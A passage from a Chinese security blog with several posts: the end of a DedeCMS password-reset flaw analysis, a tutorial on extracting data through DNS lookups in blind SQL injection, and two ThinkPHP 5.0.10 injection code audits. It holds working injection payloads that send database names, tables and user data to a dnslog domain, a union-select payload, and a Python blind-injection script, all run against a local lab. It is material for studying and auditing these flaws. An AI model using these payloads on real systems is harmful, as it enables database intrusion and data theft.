        return ShowMsg(&apos;对不起，请10分钟后再重新申请&apos;, &apos;login.php&apos;);
    }
}
</code></pre><p>这里代码逻辑是先根据<code>id</code>从<code>dede_pwd_tmp</code>数据表中判断是否有对应的密码记录,若账号为第一次修改密码,这里的<code>$row</code>就会空,进入<code>newmail()</code>函数,执行<code>insert()</code>操作:</p>
<pre><code>#uploads\member\resetpassword.php 73行
function newmail($mid, $userid, $mailto, $type, $send)
{
    ...
    $randval = random(8);
    ...
    if($type == &apos;INSERT&apos;)
    {
        $key = md5($randval);
        $sql = &quot;INSERT INTO `#@__pwd_tmp` (`mid` ,`membername` ,`pwd` ,`mailtime`)VALUES (&apos;$mid&apos;, &apos;$userid&apos;,  &apos;$key&apos;, &apos;$mailtime&apos;);&quot;;
        if($db-&gt;ExecuteNoneQuery($sql))
        {
            if($send == &apos;Y&apos;)
            {
                ...
            } else if ($send == &apos;N&apos;)
            {
                return ShowMsg(&apos;稍后跳转到修改页&apos;, $cfg_basehost.$cfg_memberurl.&quot;/resetpassword.php?dopost=getpasswd&amp;amp;id=&quot;.$mid.&quot;&amp;amp;key=&quot;.$randval);
            }
        }
        else
        {
            }
    }
</code></pre><p>先生成一个8位的随机密码并赋值给<code>$randval</code>,然后将其用md5加密,存储到<code>dede__pwd_tmp</code>表中,接着到了漏洞的触发点,进入<code>$send == &#39;N&#39;</code>的操作,将未经md5加密的<code>$randval</code>传给了用户</p>
<p>那么这里拼接的url就为:</p>
<pre><code>http://127.0.0.1:84/member/resetpassword.php?dopost=getpasswd&amp;id=9&amp;key=3uZAQ9Z
</code></pre><p>继续跟进<code>dopost=getpasswd</code>的操作:<br><img src="http://static.zybuluo.com/chhyx/4cqrpdq1s825scwx95egp69y/image_1cocmr2gijdf16uf1q5upne1l5p7r.png" alt="image_1cocmr2gijdf16uf1q5upne1l5p7r.png-68.6kB"></p>
<p>这里先判断<code>id</code>是否执行过重置密码的操作 如果没有则退出,接着进入了<code>empty($setp)</code>的操作:</p>
<pre><code> if(empty($setp))
{
    $tptim= (60*60*24*3);
    $dtime = time();
    if($dtime - $tptim &gt; $row[&apos;mailtime&apos;])
    {
        $db-&gt;executenonequery(&quot;DELETE FROM `#@__pwd_tmp` WHERE `md` = &apos;$id&apos;;&quot;);
        ShowMsg(&quot;对不起，临时密码修改期限已过期&quot;,&quot;login.php&quot;);
        exit();
    }
    require_once(dirname(__FILE__).&quot;/templets/resetpassword2.htm&quot;);
}
</code></pre><p>判断是否超过修改期限 最后包含了<code>resetpassword2.htm</code><br>我们跟进去看一下:</p>
<pre><code>#uploads\member\templets\resetpassword2.htm
</code></pre><p><img src="http://static.zybuluo.com/chhyx/52avfkywkcw0e0lr2mtt4yuz/image_1cocqa07i19e01jl1gpl15sv1cme9.png" alt="image_1cocqa07i19e01jl1gpl15sv1cme9.png-41.6kB"></p>
<p>页面设置了setp为2 我们回到刚才的php文件继续分析<br>进入<code>$setp == 2</code>的操作:</p>
<pre><code>#uploads\member\resetpassword.php 123行
elseif($setp == 2)
{
    if(isset($key)) $pwdtmp = $key;
    $sn = md5(trim($pwdtmp));
    if($row[&apos;pwd&apos;] == $sn)
    {
        if($pwd != &quot;&quot;)
        {
            if($pwd == $pwdok)
            {
                $pwdok = md5($pwdok);
                $sql = &quot;DELETE FROM `#@__pwd_tmp` WHERE `mid` = &apos;$id&apos;;&quot;;
                $db-&gt;executenonequery($sql);
                $sql = &quot;UPDATE `#@__member` SET `pwd` = &apos;$pwdok&apos; WHERE `mid` = &apos;$id&apos;;&quot;;
                if($db-&gt;executenonequery($sql))
                {
                    showmsg(&apos;更改密码成功，请牢记新密码&apos;, &apos;login.php&apos;);
                    exit;
                }
            ...
}
</code></pre><p>这里判断了<code>$sn</code>与<code>dede__pwd_tmp</code>的<code>pwd</code>值(<code>$key</code>)是否相等,因为<br><code>$sn=md5($randval)=$row[&#39;pwd&#39;]</code> 所以进入下面的更改密码操作。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/26/利用DNSLOG快速获取数据(盲注)/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/09/26/利用DNSLOG快速获取数据(盲注)/" itemprop="url">渗透技巧 |  利用DNSLOG快速获取数据(盲注)</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-26T09:26:41+08:00">
                2018-09-26
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>DNS注入就是通过数据库对域名发起dns解析请求来达到快速获取数据目的</p>
</blockquote>
<hr>
<p>1.先介绍下mysql的<code>load_file()</code>函数:</p>
<blockquote>
<p><strong>LOAD_FILE(file_name)</strong><br>读取文件并返回文件内容为字符串。要使用此函数,文件必须位于服务器主机上,必须指定完整路径的文件,而且必须有FILE权限。<br>该文件所有字节可读,但文件内容必须小于<strong>max_allowed_packet</strong>。 如果该文件不存在或无法读取,因为前面的条件之一不满足,函数返回<br>NULL。 在MySQL 5.0.19,<strong>character_set_filesystem</strong>系统变量控制文件名的解释,即仅作文字字符串。</p>
</blockquote>
<p>读取文件:<br><img src="http://static.zybuluo.com/chhyx/uwgzjrbxxkbuqhfv1w6u7xcy/image_1co8h76to15971pu6akagogf4k19.png" alt="image_1co8h76to15971pu6akagogf4k19.png-16.7kB"></p>
<p>实际上<code>load_file()</code>函数还可以用来发送dns解析请求<br><img src="http://static.zybuluo.com/chhyx/3z50i936q7geyodeq99buky1/image_1co8poe7gcta1tov1vfl19tgsrt6i.png" alt="image_1co8poe7gcta1tov1vfl19tgsrt6i.png-24.3kB"></p>
<p>而这就是dns注入的<strong>关键</strong></p>
<p>2.存在局限:<br>A.<code>load_file</code>函数在<code>Linux</code>下是无法用来做<code>dnslog</code>攻击的，因为在这里就涉及到<code>Windows</code>的一个小Tips——<code>UNC路径</code>,我们看下UNC在百度上的解释:</p>
<p><img src="http://static.zybuluo.com/chhyx/k3kx7dz4o3yyg4wr2famxmbl/image_1co9pm7mstkmdbr1fbp1l9155s69.png" alt="image_1co9pm7mstkmdbr1fbp1l9155s69.png-48.1kB"></p>
<p>sql语句:</p>
<pre><code>select load_file(&apos;\\\\test.xxxx.ceye.io\\abc&apos;);
</code></pre><p>这就解释了为什么在mysql中运行<code>concat()</code>函数拼接了4个<code>\</code>了,因为转义 4个<code>\</code>变成了2个<code>\</code>,目的就是利用UNC路径。因为Linux没有UNC路径这个东西 所以不能使用这种方式外带数据</p>
<p>B.MySQL数据库配置中要设置<code>secure_file_priv</code>为空,才能完整的去请求<code>DNS</code><br>在<code>mysql.ini</code>设置:<br><img src="http://static.zybuluo.com/chhyx/bdr8rjiu9seakpet2dgceqr6/image_1co9nblsueuq13uj1lce183d0b13.png" alt="image_1co9nblsueuq13uj1lce183d0b13.png-45.3kB"></p>
<p>查看设置:<br><img src="http://static.zybuluo.com/chhyx/g70wz91gxlp9ogusj8n5zc8z/image_1co9n8b6h1f821uc6lg0vokai19.png" alt="image_1co9n8b6h1f821uc6lg0vokai19.png-11.8kB"></p>
<pre><code>当secure_file_priv为空，就可以读取磁盘的目录。
当secure_file_priv为G:\，就可以读取G盘的文件。
当secure_file_priv为null，load_file就不能加载文件。
</code></pre><p>3.使用<code>dns注入</code>需要注意:</p>
<pre><code>a.网站必须运行在`Windows`平台上
b.MySQL中的`secure_file_priv`必须为空
c.域名前缀长度限制在63个字符,解决办法是用mid()函数来获取。
d.域名前缀不支持一些特殊字符,如*,解决办法是用hex()或者其他加密函数,获取到数据后再解密。
e.sqlmap也提供了这种注入方法,参数：`–dns-domain`
</code></pre><p>4.实战:<br>咱们以笔者昨天分析的TP5.0.10的一处盲注为例子,具体看<br>A.获取数据库名:<br>payload:</p>
<pre><code>user[0]=EXISTS&amp;user[1]=select * from user where if((select load_file(concat(&apos;\\\\\\\\&apos;,(select hex(database())),&apos;.xxxx.ceye.io\\abc&apos;))),1,1)
</code></pre><p><img src="http://static.zybuluo.com/chhyx/qylgxwd143p8unipijf5iwaa/image_1co9r9jap1s8m1t0c1bf81cq2ghk7g.png" alt="image_1co9r9jap1s8m1t0c1bf81cq2ghk7g.png-48.7kB"></p>
<p>dnslog平台收到:<br><img src="http://static.zybuluo.com/chhyx/8h5103qsd2tpj5h285at60yo/image_1co9r8lts151317bj124o1coec0673.png" alt="image_1co9r8lts151317bj124o1coec0673.png-17.6kB"></p>
<p>paylaod解释:</p>
<pre><code>concat 将字符串拼接
database()  数据库查询语句
hex()   hex加密 防止数据库有特殊字符传不出来
.xxxx.ceye.io\abc  dnslog平台给的域名
这里拼接起来是:load_file(&apos;\\\\\\\\ tp.xxxx.ceye.io\\abc&apos;),相当于访问了带有数据库名称的三级域名,被dns捕捉到了
</code></pre><p>B.获取表信息:<br>payload:</p>
<pre><code>user[0]=EXISTS&amp;user[1]=select * from user where if((select load_file(concat(&apos;\\\\\\\\&apos;,(select table_name from information_schema.tables where table_schema=&apos;tp&apos; limit 0,1),&apos;.xxxx.ceye.io\\abc&apos;))),1,1)
</code></pre><p>通过改变limit 0,1来一个一个解析(limit 1,1、limit 2,1)<br>第一张表:<br><img src="http://static.zybuluo.com/chhyx/1ha3t6253yavexd5sm7ob31t/image_1co8lqvgd1k87all4a8a5f18302g.png" alt="image_1co8lqvgd1k87all4a8a5f18302g.png-15.1kB"></p>
<p>第二张表:<br><img src="http://static.zybuluo.com/chhyx/c1948vsz89c04qyzla4uzzg0/image_1co8lt5hbua1v5m18dc1hbd5dt2t.png" alt="image_1co8lt5hbua1v5m18dc1hbd5dt2t.png-14.5kB"></p>
<p>C:获取<code>gather</code>表内的字段名:</p>
<pre><code>user[0]=EXISTS&amp;user[1]=select * from user where if((select load_file(concat(&apos;\\\\\\\\&apos;,(select column_name from information_schema.columns where table_name = &apos;gather&apos; limit 1,1),&apos;.xxxx.ceye.io\\abc&apos;))),1,1)
</code></pre><p><img src="http://static.zybuluo.com/chhyx/hm6avbqq4034mn0v9tqxlkgk/image_1co8mbnnc1iupko85c51cvu1k8e3n.png" alt="image_1co8mbnnc1iupko85c51cvu1k8e3n.png-6.4kB"><br><img src="http://static.zybuluo.com/chhyx/167hww2kvi3mwsabu0o90z2r/image_1co8mb1376kg3o2mv19fj1gr73a.png" alt="image_1co8mb1376kg3o2mv19fj1gr73a.png-6.5kB"><br><img src="http://static.zybuluo.com/chhyx/gt3mzhhv7vqb99s298bv3feu/image_1co8mcsk61b1ur6o11j1nervde44.png" alt="image_1co8mcsk61b1ur6o11j1nervde44.png-6kB"></p>
<p>D.获取3个字段的的数据:</p>
<pre><code>user[0]=EXISTS&amp;user[1]=select * from user where if((select load_file(concat(&apos;\\\\\\\\&apos;,(select username from gather limit 0,1),&apos;.xxxx.ceye.io\\abc&apos;))),1,1)  //username gather_waf id
</code></pre><p><img src="http://static.zybuluo.com/chhyx/dt558yb8dyxzlcctnbwos9j1/image_1co8pd457cnc15tmhm1o7g13h85b.png" alt="image_1co8pd457cnc15tmhm1o7g13h85b.png-6kB"><br><img src="http://static.zybuluo.com/chhyx/pm64dlz4zw95k9grz83oj8xb/image_1co8pbp53ra3qv81qtu18u0ou84u.png" alt="image_1co8pbp53ra3qv81qtu18u0ou84u.png-6.8kB"><br><img src="http://static.zybuluo.com/chhyx/4zkcoqwoch8t9b57matnxrru/image_1co8pf4hsouq167e1pdsi6qa705o.png" alt="image_1co8pf4hsouq167e1pdsi6qa705o.png-5.7kB"></p>
<p><img src="http://static.zybuluo.com/chhyx/6n3qvx9jkec1utlw8r58qj2x/image_1co8pfq2417i88stpo21m5794665.png" alt="image_1co8pfq2417i88stpo21m5794665.png-10.2kB"></p>
<p>相比于通过猜解获取信息,用dnslog算是挺高效的。虽然利用条件不算宽松,但是技巧还是值得学习的。 </p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/25/thinkphp5.0.10函数过滤不全导致一处盲注/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/09/25/thinkphp5.0.10函数过滤不全导致一处盲注/" itemprop="url">代码审计 |  thinkphp5.0.10函数过滤不全导致一处盲注</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-25T09:15:41+08:00">
                2018-09-25
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>跟着P师傅后面捡洞不容易,洞虽然撞了,但毕竟是自己审出来的,还是分析记录一波</p>
</blockquote>
<hr>
<p>##<strong>1.基础知识:</strong><br>A.<code>Thinkphp</code>的一些基本操作<br><img src="http://static.zybuluo.com/chhyx/a3hij28f4rsix5nv4bwd7z5d/image_1co76cjk27kqo00i3auj21f3l3c.png" alt="image_2co63sh5e1locbbe1l3epu38hqm.png-91.1kB"><br>更多基础知识可参考文章：<br><a href="http://static.zybuluo.com/chhyx/a3hij28f4rsix5nv4bwd7z5d/image_1co76cjk27kqo00i3auj21f3l3c.png" target="_blank" rel="noopener">https://p0rz9.github.io/2018/09/15/ThinkPHP</a></p>
<p>##<strong>2.环境搭建:</strong><br>A.index.php</p>
<pre><code>#application\index\controller\Index.php
&lt;?php
namespace app\index\controller;
use think\Db;
use think\Controller;
class Index extends Controller
{
    public function index()
    {
        $post_user = input(&apos;post.user/a&apos;);
        $a = Db::table(&apos;user&apos;)-&gt;where(array(&apos;ID&apos; =&gt; $post_user))-&gt;select();
        var_dump($a);
    }
}
</code></pre><p>B.对应数据库下新建表<code>user</code>  <code>gather</code></p>
<p><strong>3.漏洞利用:</strong><br>payload：</p>
<pre><code>post:
user[0]=EXISTS&amp;user[1]=select * from user where 1=1  √
user[0]=EXISTS&amp;user[1]=select * from user where 1=2  ×
</code></pre><p><img src="http://static.zybuluo.com/chhyx/79u46kfp4fetv0n47w75geqi/image_1co76r19t151vpd83b721qq4r5i.png" alt="image_1co76r19t151vpd83b721qq4r5i.png-42.8kB"><br><img src="http://static.zybuluo.com/chhyx/kbnpxx1fq21u73e3x3rxgmvz/image_1co76sdqv1svb13ae158d1g3l7tl6c.png" alt="image_1co76sdqv1svb13ae158d1g3l7tl6c.png-35.7kB"></p>
<p>##<strong>4.代码审计:</strong><br><strong>造成漏洞的原因与上篇文章一样,都是函数过滤不全导致的注入问题</strong><br>首先从<code>index.php</code>开始分析:</p>
<pre><code>$a = Db::table(&apos;user&apos;)-&gt;where(array(&apos;ID&apos; =&gt; $post_user))-&gt;select();
</code></pre><p>A.跟进<code>thinkphp\library\think\db\Query.php</code>的<code>select()</code>函数:</p>
<pre><code>#thinkphp\library\think\db\Query.php 2290行
public function select($data = null)
...
if (false === $resultSet) {
        // 生成查询SQL
        $sql = $this-&gt;builder-&gt;select($options);
        // 获取参数绑定
        $bind = $this-&gt;getBind();
...
</code></pre><p>B.跟进<code>thinkphp\library\think\db\bulider.php</code>的<code>select()</code>函数</p>
<pre><code>#thinkphp\library\think\db\bulider.php 692行
</code></pre><p><img src="http://static.zybuluo.com/chhyx/b7xufwpqmq4qphlyytfivelj/image_1co76e4lql0519tvp9f10inbd648.png" alt="image_1co63sh5e1locbbe1l3epu38hqm.png-91.1kB"></p>
<p>C.跟进<code>parseWhere()</code>函数:</p>
<pre><code>#thinkphp\library\think\db\bulider.php 224行
protected function parseWhere($where, $options)
{   
    $whereStr = $this-&gt;buildWhere($where, $options);//跟进
    if (!empty($options[&apos;soft_delete&apos;])) {
        // 附加软删除条件
        list($field, $condition) = $options[&apos;soft_delete&apos;];
        $binds    = $this-&gt;query-&gt;getFieldsBind($options[&apos;table&apos;]);
        $whereStr = $whereStr ? &apos;( &apos; . $whereStr . &apos; ) AND &apos; : &apos;&apos;;
        $whereStr = $whereStr . $this-&gt;parseWhereItem($field, $condition, &apos;&apos;, $options, $binds);
    }
    return empty($whereStr) ? &apos;&apos; : &apos; WHERE &apos; . $whereStr;
}
</code></pre><p>D.跟进<code>buildWhere()</code>函数</p>
<pre><code>#thinkphp\library\think\db\bulider.php 245行
public function buildWhere($where, $options)
    { 
    ...
    $whereStr = &apos;&apos;;
    $binds    = $this-&gt;query-&gt;getFieldsBind($options[&apos;table&apos;]);
        foreach ($where as $key =&gt; $val) {
            $str = [];
......
else {//进入
                    // 对字段使用表达式查询
    $field = is_string($field) ? $field : &apos;&apos;;
    $str[] = &apos; &apos; . $key . &apos; &apos; . $this-&gt;parseWhereItem($field, $value, $key, $options, $binds);

 }
        }

        $whereStr .= empty($whereStr) ? substr(implode(&apos; &apos;, $str), strlen($key) + 1) : implode(&apos; &apos;, $str);
    }

    return $whereStr;
</code></pre><p>E.跟进核心函数<code>parseWhereItem()</code>：</p>
<pre><code>#thinkphp\library\think\db\bulider.php 300行
protected function parseWhereItem($field, $val, $rule = &apos;&apos;, $options = [], $binds = [], $bindName = null)
    {
    ...
    // 检测操作符
    if (!in_array($exp, $this-&gt;exp)) {//进入
        $exp = strtolower($exp);
        if (isset($this-&gt;exp[$exp])) {
            $exp = $this-&gt;exp[$exp];
            //$exp:EXISTS
        } 
    ...
    $whereStr = &apos;&apos;;
    ...
    //exists操作有关代码
    elseif (in_array($exp, [&apos;NOT EXISTS&apos;, &apos;EXISTS&apos;])) {
        //$exp:EXISTS  $value:select * from user where 1=1
        if ($value instanceof \Closure) {
            $whereStr .= $exp . &apos; &apos; . $this-&gt;parseClosure($value);
        } else {
            $whereStr .= $exp . &apos; (&apos; . $value . &apos;)&apos;;
            //$whereStr:EXISTS (select * from user where 1=1
        }
</code></pre><p>可以看到我们TP框架并没有对我们传输进去的<code>$value</code>进行过滤 而直接拼接到<code>$whereStr</code>变量 最后拼接到<code>$sql</code>语句中 导致注入</p>
<p>F.我们看下tp框架系统核心函数之一的<code>input()</code>函数,它的功能是帮助我们获取各种变量及自动过滤:<br>我们跟进<code>thinkphp\library\think\Requests.php</code>的<code>input()</code>函数：<br>我们查看过滤器相关代码:</p>
<pre><code>#thinkphp\library\think\Requests.php 971行
public function input($data = [], $name = &apos;&apos;, $default = null, $filter = &apos;&apos;)
...   
$filter = $this-&gt;getFilter($filter, $default);
if (is_array($data)) {
    array_walk_recursive($data, [$this, &apos;filterValue&apos;], $filter);
    reset($data);
} else {
    $this-&gt;filterValue($data, $name, $filter);
}

if (isset($type) &amp;&amp; $data !== $default) {
    // 强制类型转换
    $this-&gt;typeCast($data, $type);
}
return $data;
</code></pre><p>G.这里判断了变量是否为数组 这里调用了<code>filterValue()</code>函数进行过滤 跟进函数:</p>
<pre><code>#thinkphp\library\think\Requests.php 1054行
private function filterValue(&amp;$value, $key, $filters)
{
...
return $this-&gt;filterExp($value);
}
</code></pre><p>跟进<code>filterExp()</code>函数:</p>
<pre><code>public function filterExp(&amp;$value)
{
// 过滤查询特殊字符
if (is_string($value) &amp;&amp; preg_match(&apos;/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i&apos;, $value)) {
    $value .= &apos; &apos;;
}
// TODO 其他安全过滤
}
</code></pre><p>H.这个函数的作用很简单,判断传进来的表达式是否属于敏感关键字,如果是—&gt;关键字后加空格,来进行给过滤<br>如传进来的post数据:</p>
<pre><code>x[0]=in&amp;x[1]=1
</code></pre><p>服务器接收时如果没有进行过滤:</p>
<pre><code>$date[&apos;x&apos;] = array(&apos;in&apos;=&gt;&apos;1&apos;)
</code></pre><p>如果被<code>filterExp()</code>过滤后:</p>
<pre><code>$date[&apos;x&apos;] = array(&apos;in &apos;=&gt;&apos;1&apos;)
</code></pre><p>这样就无法被服务器解析 也就避免了漏洞</p>
<p>I.但是因为TP5重写了数据库操作的方法,忽略了一些敏感操作 导致我们可以绕过TP的过滤机制</p>
<pre><code>#thinkphp\library\think\db\bulider.php 重写表达式
</code></pre><p><img src="http://static.zybuluo.com/chhyx/a3hij28f4rsix5nv4bwd7z5d/image_1co76cjk27kqo00i3auj21f3l3c.png" alt="image_1co76cjk27kqo00i3auj21f3l3c.png-52.1kB"></p>
<pre><code>#thinkphp\library\think\Requests.php  过滤表达式
</code></pre><p><img src="http://static.zybuluo.com/chhyx/b7xufwpqmq4qphlyytfivelj/image_1co76e4lql0519tvp9f10inbd648.png" alt="image_1co76e4lql0519tvp9f10inbd648.png-23.4kB"></p>
<p>我们可看到这里并没有对<code>exists</code>、<code>NOT EXISTS</code>、<code>notexists</code>等表达式进行过滤,导致了注入。</p>
<p>这里写了一个py盲注出数据表的脚本:</p>
<pre><code>#!/usr/bin/python
# encoding: utf-8
import requests

string = &apos;abcdefghijklmnopqrstuvwxyzAbCDEFGHIJKLMNOPQRSTUVWXYZ_&apos;
url = &apos;http://127.0.0.1:82/public/index.php/index/index/index&apos;
headers = {
&apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0)       Gecko/20100101 Firefox/46.0&apos;,
&apos;Content-Type&apos;: &apos;application/x-www-form-urlencoded&apos;
}    
//传入table的长度即可
def get_table_name(table_length):
result_table_name = &apos;&apos;
flag = 0
for i in range(0,table_length+1):
    if flag:
        break;
    for char in string:
        data=&apos;&apos;&apos;user[0]=EXISTS&amp;user[1]=select * from user where (SELECT 1 FROM information_schema.tables WHERE 
            TABLE_SCHEMA=&quot;tp&quot; AND table_name REGEXP &apos;^%s[a-z]&apos; LIMIT 0,1)&apos;&apos;&apos;%(result_table_name+char)
        re = requests.post(url,data=data,headers=headers)
        if &apos;array(3)&apos; in re.text and re.status_code == 200:
            result_table_name += char
            print &apos;result_table_name:&apos;+result_table_name
            if(i == table_length-2):
                for chr2 in string:
                    data = &apos;&apos;&apos;user[0]=EXISTS&amp;user[1]=select * from user where (SELECT 1 FROM information_schema.tables WHERE 
                                TABLE_SCHEMA=&quot;tp&quot; AND table_name REGEXP &apos;^%s[a-%s]&apos; LIMIT 0,1)&apos;&apos;&apos;%(result_table_name,chr2)
                    re = requests.post(url,data=data,headers=headers)
                    if &apos;array(3)&apos; in re.text and re.status_code == 200:
                        result_table_name += chr2
                        print &apos;result_table_name:&apos;+result_table_name
                        break
            flag = 0
            break
print &apos;[+]result_table_name:&apos;+result_table_name    

get_table_name(6)//运行函数
</code></pre><p><img src="http://static.zybuluo.com/chhyx/ccs5d8sokh6yvo2gd578o95r/image_1co7pdni110vd2731um1p352fr9.png" alt="image_1co7pdni110vd2731um1p352fr9.png-107.4kB"></p>
<p>由于笔者对sql注入不是很擅长,等有时间总结一波再返回来再改脚本。</p>
<p><strong>5.参考链接:</strong><br><a href="https://www.kancloud.cn/manual/thinkphp5/118044" target="_blank" rel="noopener">https://www.kancloud.cn/manual/thinkphp5/118044</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/25/thinkphp5.0.10函数过滤不全导致注入/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/09/25/thinkphp5.0.10函数过滤不全导致注入/" itemprop="url">代码审计 |  thinkphp5.0.10函数过滤不全导致注入</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-25T08:15:41+08:00">
                2018-09-25
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>中秋过了,博客开始更新,这两天审计TP框架,跟着P师傅的思路发现了一些问题,这里分析记录一波</p>
</blockquote>
<hr>
<p>##<strong>1.基础知识</strong><br>A.<code>Thinkphp</code>的一些基本操作<br><img src="http://static.zybuluo.com/chhyx/3sb6ttvy8bj5pf1o3wqj1am2/image_1cne0gl8i1jo21s7mj8l7qg1c0220.png" alt="image_2co63sh5e1locbbe1l3epu38hqm.png-91.1kB"><br>更多基础知识可参考文章：<br><a href="https://p0rz9.github.io/2018/09/15/ThinkPHP%E6%A1%86%E6%9E%B6%205.0.x%20sql%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/09/15/ThinkPHP</a></p>
<p>##<strong>2.环境搭建:</strong><br>A.index.php</p>
<pre><code>#application\index\controller\Index.php
&lt;?php
namespace app\index\controller;
use think\Db;
use think\Controller;
class Index extends Controller
{
    public function index()
    {
        $post_user = input(&apos;post.user/a&apos;);
        $a = Db::table(&apos;user&apos;)-&gt;where(array(&apos;ID&apos; =&gt; $post_user))-&gt;select();
        var_dump($a);
    }
}
</code></pre><p>B.对应数据库下新建表<code>user</code></p>
<p>##<strong>3.漏洞利用:</strong><br>payload：</p>
<pre><code>post:user[0]=not like&amp;user[1][0]=aaa&amp;user[1][3]=bbb&amp;user[2]=) and 1=2 union select 1,user(),3 from user--
</code></pre><p><img src="http://static.zybuluo.com/chhyx/ycb34r3alak730vb82c9b6io/image_1co63bm74pidqmhrj148h6db2c.png" alt="image_1co63bm74pidqmhrj148h6db2c.png-43.6kB"></p>
<p>##<strong>4.代码审计:</strong><br><strong>相关变量已经写到注释中</strong><br>首先从<code>index.php</code>开始分析:</p>
<pre><code>$a = Db::table(&apos;user&apos;)-&gt;where(array(&apos;ID&apos; =&gt; $post_user))-&gt;select();
</code></pre><p>A.跟进<code>thinkphp\library\think\db\Query.php</code>的<code>select()</code>函数:</p>
<pre><code>#thinkphp\library\think\db\Query.php 2290行
public function select($data = null)
...
if (false === $resultSet) {
        // 生成查询SQL
        $sql = $this-&gt;builder-&gt;select($options);
        // 获取参数绑定
        $bind = $this-&gt;getBind();
...
</code></pre><p>B.跟进<code>thinkphp\library\think\db\bulider.php</code>的<code>select()</code>函数</p>
<pre><code>#thinkphp\library\think\db\bulider.php 692行
</code></pre><p><img src="http://static.zybuluo.com/chhyx/561s2vvojdrgh5ahacqn8cky/image_1co63sh5e1locbbe1l3epu38hqm.png" alt="image_1co63sh5e1locbbe1l3epu38hqm.png-91.1kB"></p>
<p>C.跟进<code>parseWhere()</code>函数:</p>
<pre><code>#thinkphp\library\think\db\bulider.php 224行
protected function parseWhere($where, $options)
{   
    $whereStr = $this-&gt;buildWhere($where, $options);//跟进
    if (!empty($options[&apos;soft_delete&apos;])) {
        // 附加软删除条件
        list($field, $condition) = $options[&apos;soft_delete&apos;];
        $binds    = $this-&gt;query-&gt;getFieldsBind($options[&apos;table&apos;]);
        $whereStr = $whereStr ? &apos;( &apos; . $whereStr . &apos; ) AND &apos; : &apos;&apos;;
        $whereStr = $whereStr . $this-&gt;parseWhereItem($field, $condition, &apos;&apos;, $options, $binds);
    }
    return empty($whereStr) ? &apos;&apos; : &apos; WHERE &apos; . $whereStr;
}
</code></pre><p>D.跟进<code>buildWhere()</code>函数</p>
<pre><code>#thinkphp\library\think\db\bulider.php 245行
public function buildWhere($where, $options)
    { 
    ...
    $whereStr = &apos;&apos;;
    $binds    = $this-&gt;query-&gt;getFieldsBind($options[&apos;table&apos;]);
        foreach ($where as $key =&gt; $val) {
            $str = [];
......
else {//进入
                    // 对字段使用表达式查询
    $field = is_string($field) ? $field : &apos;&apos;;
    $str[] = &apos; &apos; . $key . &apos; &apos; . $this-&gt;parseWhereItem($field, $value, $key, $options, $binds);

 }
        }

